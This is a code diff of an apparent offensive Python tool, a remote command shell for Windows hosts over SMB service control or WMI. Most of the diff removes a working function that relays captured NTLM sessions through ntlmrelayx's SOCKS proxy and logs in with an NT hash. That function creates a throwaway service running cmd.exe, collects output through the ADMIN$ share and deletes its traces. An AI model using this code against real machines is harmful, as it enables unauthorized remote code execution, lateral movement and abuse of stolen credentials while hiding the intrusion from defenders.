@@ -227,231 +227,6 @@ def _scm_exec(host, auth, command, cwd, timeout=120, verbose=False):
     return result, 0
 
 
-# ── Python/impacket SCM exec for relay sessions ───────────────────────────────
-
-def _scm_exec_relay(host, auth, command, cwd, timeout=120, verbose=False):
-    """Execute via a transient service using a single shared SMBConnection.
-
-    Unlike _scm_exec (which spawns Titanis Scm), this opens one Python-level
-    SMBConnection so proxychains only triggers one NTLM auth exchange against
-    ntlmrelayx — matching the susinternals -socks pattern.  Use this when
-    --socks is set (ntlmrelayx --socks relay session via proxychains).
-
-    Routing:
-      proxychains-ng 4.x in LD_PRELOAD → Python sockets intercepted automatically.
-      proxychains 3.x / none           → local TCP→SOCKS5 forwarder thread routes
-                                         SMBConnection through ntlmrelayx:1080
-                                         directly (no hook needed; ntlmrelayx is
-                                         always local).
-    """
-    import io as _io
-    import socket as _socket
-    import threading as _threading
-    from impacket.smbconnection import SMBConnection
-    from impacket.dcerpc.v5 import scmr, transport as dce_transport
-    from titanlib.relay_proxy import (_socks5_connect,
-                                      _find_proxychains_conf,
-                                      _parse_socks5_upstream)
-
-    def _get(flag):
-        try:
-            return auth[auth.index(flag) + 1]
-        except (ValueError, IndexError):
-            return ''
-
-    domain   = _get('-UserDomain')
-    username = _get('-UserName')
-    nt_hash  = _get('-NtlmHash') or '31d6cfe0d16ae931b73c59d7e0c089c0'
-    svc_name  = 'ts' + _rand(6)
-    out_fname = _rand(10) + '.txt'
-    out_win   = f'C:\\Windows\\Temp\\{out_fname}'
-    ip        = _resolve_ip(host)
-    bin_path  = (f'C:\\Windows\\System32\\cmd.exe /c '
-                 f'cmd.exe /c "cd /d {cwd} & ({command}) > {out_win} 2>&1"')
-
-    if verbose:
-        print(f'  [relay-exec] svc={svc_name}  out={out_win}', file=sys.stderr)
-        print(f'  [relay-exec] user={domain}\\{username}  ip={ip}', file=sys.stderr)
-
-    # proxychains-ng 4.x intercepts Python socket calls automatically.
-    # proxychains 3.x and bare invocations do not — spin up a forwarder.
-    pc4_active = 'proxychains.so.4' in os.environ.get('LD_PRELOAD', '').lower()
-
-    smb_host = ip
-    smb_port = 445
-    stop_fwd = None
-
-    if not pc4_active:
-        # Read ntlmrelayx SOCKS address from proxychains conf (default 127.0.0.1:1080).
-        relay_host, relay_port = '127.0.0.1', 1080
-        conf = _find_proxychains_conf()
-        if conf:
-            try:
-                relay_host, relay_port = _parse_socks5_upstream(conf)
-            except Exception:
-                pass
-
-        if verbose:
-            print(f'  [relay-exec] forwarder: 127.0.0.1:* → '
-                  f'ntlmrelayx {relay_host}:{relay_port} → {ip}:445',
-                  file=sys.stderr)
-
-        def _relay_connect():
-            """SOCKS5 to ntlmrelayx, supporting both no-auth and user:pass.
-
-            ntlmrelayx may require USERNAME:PASSWORD auth (method 0x02) where
-            username = DOMAIN/USER to identify which relay session to use.
-            Offer both methods so either version is handled automatically.
-            """
-            import struct as _struct
-            s = _socket.create_connection((relay_host, relay_port))
-            s.sendall(b'\x05\x02\x00\x02')   # offer no-auth + user:pass
-            resp = s.recv(2)
-            if len(resp) < 2:
-                raise RuntimeError('ntlmrelayx SOCKS closed connection during handshake')
-            if resp[1] == 0xff:
-                raise RuntimeError('ntlmrelayx SOCKS: no acceptable auth method')
-            if resp[1] == 0x02:
-                # Username:password sub-negotiation (RFC 1929)
-                # ntlmrelayx uses DOMAIN/USER as the username to pick the session.
-                user = f'{domain}/{username}'.encode()
-                pwd  = b'relay'
-                s.sendall(bytes([1, len(user)]) + user + bytes([len(pwd)]) + pwd)
-                r = s.recv(2)
-                if len(r) < 2 or r[1] != 0:
-                    raise RuntimeError(
-                        f'ntlmrelayx SOCKS user:pass auth failed for '
-                        f'{domain}/{username}: {r!r}')
-            # CONNECT request (IPv4)
-            packed_ip = _socket.inet_aton(ip)
-            req = _struct.pack('!BBBB4sH', 5, 1, 0, 1, packed_ip, 445)
-            s.sendall(req)
-            r = s.recv(4)
-            if len(r) < 4 or r[1] != 0:
-                raise RuntimeError(
-                    f'ntlmrelayx SOCKS CONNECT to {ip}:445 failed '
-                    f'(code={r[1] if len(r)>1 else "?"}): {r!r}')
-            atype = r[3]
-            if   atype == 1: s.recv(6)
-            elif atype == 3:
-                n = ord(s.recv(1))
-                s.recv(n + 2)
-            elif atype == 4: s.recv(18)
-            return s
-
-        # Listener on a random local port.  Each incoming SMBConnection triggers
-        # a fresh SOCKS5 tunnel to ntlmrelayx.  Because relay_host is 127.0.0.1
-        # the connect goes direct — no proxychains hook required.
-        srv = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
-        srv.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
-        srv.bind(('127.0.0.1', 0))
-        srv.listen(10)
-        smb_host = '127.0.0.1'
-        smb_port = srv.getsockname()[1]
-        fwd_stop = _threading.Event()
-
-        def _pipe(a, b):
-            try:
-                while True:
-                    d = a.recv(65536)
-                    if not d:
-                        break
-                    b.sendall(d)
-            except Exception:
-                pass
-            finally:
-                for s in (a, b):
-                    try: s.close()
-                    except Exception: pass
-
-        def _handle(client):
-            try:
-                relay = _relay_connect()
-                _threading.Thread(target=_pipe, args=(relay, client),
-                                   daemon=True).start()
-                _pipe(client, relay)
-            except Exception as e:
-                print(f'  [relay-exec] forwarder: {e}', file=sys.stderr)
-            finally:
-                try: client.close()
-                except Exception: pass
-
-        def _accept():
-            srv.settimeout(0.5)
-            while not fwd_stop.is_set():
-                try:
-                    conn, _ = srv.accept()
-                    _threading.Thread(target=_handle, args=(conn,),
-                                       daemon=True).start()
-                except _socket.timeout:
-                    continue
-                except Exception:
-                    break
-
-        _threading.Thread(target=_accept, daemon=True).start()
-
-        def stop_fwd():
-            fwd_stop.set()
-            try: srv.close()
-            except Exception: pass
-
-    smb = None
-    try:
-        for attempt in range(3):
-            try:
-                # remoteName=ip so SMB SESSION_REQUEST uses the real server name;
-                # remoteHost=smb_host routes TCP to the forwarder (or direct if pc4).
-                smb = SMBConnection(ip, smb_host, sess_port=smb_port)
-                smb.login(username, '', domain, lmhash='', nthash=nt_hash)
-                break
-            except Exception as e:
-                if attempt < 2:
-                    print(f'  [relay-exec] attempt {attempt+1} failed: {e}',
-                          file=sys.stderr)
-                    time.sleep(4)
-                else:
-                    return f'[!] Relay exec failed: {e}\n', 1
-
-        try:
-            rpc = dce_transport.SMBTransport(ip, filename=r'\svcctl', smb_connection=smb)
-            dce = rpc.get_dce_rpc()
-            dce.connect()
-            dce.bind(scmr.MSRPC_UUID_SCMR)
-
-            scm_h = scmr.hROpenSCManagerW(dce)['lpScHandle']
-            svc_h = scmr.hRCreateServiceW(dce, scm_h, svc_name, svc_name,
-                                           lpBinaryPathName=bin_path)['lpServiceHandle']
-            try:
-                scmr.hRStartServiceW(dce, svc_h)
-            except Exception:
-                pass  # cmd.exe exits without SetServiceStatus → timeout expected
-
-            deadline = time.monotonic() + min(timeout, 30)
-            out = ''
-            while time.monotonic() < deadline:
-                time.sleep(1)
-                try:
-                    buf = _io.BytesIO()
-                    smb.getFile('ADMIN$', f'Temp\\{out_fname}', buf.write)
-                    out = buf.getvalue().decode('utf-8', errors='replace').strip()
-                    if out:
-                        break
-                except Exception:
-                    pass
-
-            try: scmr.hRDeleteService(dce, svc_h)
-            except Exception: pass
-            try: scmr.hRCloseServiceHandle(dce, svc_h)
-            except Exception: pass
-            try: smb.deleteFile('ADMIN$', f'Temp\\{out_fname}')
-            except Exception: pass
-        except Exception as e:
-            return f'[!] Relay exec error: {e}\n', 1
-    finally:
-        if stop_fwd:
-            stop_fwd()
-
-    return (out + '\n') if out else '[!] Relay exec: no output\n', 0 if out else 1
 
 
 # ── Built-in command handlers ─────────────────────────────────────────────────
@@ -604,7 +379,7 @@ def _prompt(cwd, host):
 # ── Main shell loop ───────────────────────────────────────────────────────────
 
 def shell(host, auth, cwd='C:\\Windows\\System32', verbose=False, timeout=120,
-          use_scm=False, conn_host=None, socks=False):
+          use_scm=False, conn_host=None):
     # conn_host: IPv4 address (or resolvable name) for Titanis binary calls.
     # host: display name shown in the prompt (may be FQDN from reverse DNS).
     # When the user passes an IP in the target string, resolve_host() converts
@@ -615,12 +390,7 @@ def shell(host, auth, cwd='C:\\Windows\\System32', verbose=False, timeout=120,
 
     print(BANNER_SCM if use_scm else BANNER)
     user = auth[auth.index('-UserName') + 1] if '-UserName' in auth else '?'
-    if use_scm and socks:
-        mode = 'SCM+SMB relay (Python/impacket, single-connection)'
-    elif use_scm:
-        mode = 'SCM+SMB (port 445 only)'
-    else:
-        mode = 'WMI+SMB'
+    mode = 'SCM+SMB (port 445 only)' if use_scm else 'WMI+SMB'
     print(f'[*] Connected to {host} as {user}')
     print(f'[*] Mode: {mode}')
     print(f'[*] Working directory: {cwd}')
@@ -662,10 +432,7 @@ def shell(host, auth, cwd='C:\\Windows\\System32', verbose=False, timeout=120,
             else: print(f'[!] unknown built-in: !{cmd}  (try !help)')
             continue
 
-        if use_scm and socks:
-            out, rc = _scm_exec_relay(conn_host, auth, line, cwd,
-                                      timeout=timeout, verbose=verbose)
-        elif use_scm:
+        if use_scm:
             out, rc = _scm_exec(conn_host, auth, line, cwd,
                                 timeout=timeout, verbose=verbose)
         else:
@@ -697,11 +464,7 @@ def parse_args():
     p.add_argument('--timeout', type=int, default=120, metavar='SEC',
                    help='Command execution timeout in seconds (default: 120)')
     p.add_argument('--scm', action='store_true',
-                   help='Use SCM+SMB exec instead of WMI (port 445 only; '
-                        'works through ntlmrelayx --socks relay)')
-    p.add_argument('--socks', action='store_true',
-                   help='Use Python/impacket SCM exec over a single SMB connection '
-                        '(for ntlmrelayx --socks relay sessions; requires --scm and --no-pass)')
+                   help='Use SCM+SMB exec instead of WMI (port 445 only)')
     p.add_argument('-v', '--verbose', action='store_true')
 
     args = p.parse_args()
@@ -735,14 +498,9 @@ def main():
     # resolve_host() may have converted it to an FQDN that only has AAAA records.
     conn_host = getattr(args, 'target_raw', None) or args.target
 
-    if getattr(args, 'no_pass', False):
-        from titanlib import common, relay_proxy
-        common._relay_extra_env.update(relay_proxy.activate_relay_mode())
-
     shell(args.target, auth_args(args),
           cwd=args.cwd, verbose=args.verbose, timeout=args.timeout,
-          use_scm=args.scm, conn_host=conn_host,
-          socks=getattr(args, 'socks', False))
+          use_scm=args.scm, conn_host=conn_host)
 
 
 if __name__ == '__main__':
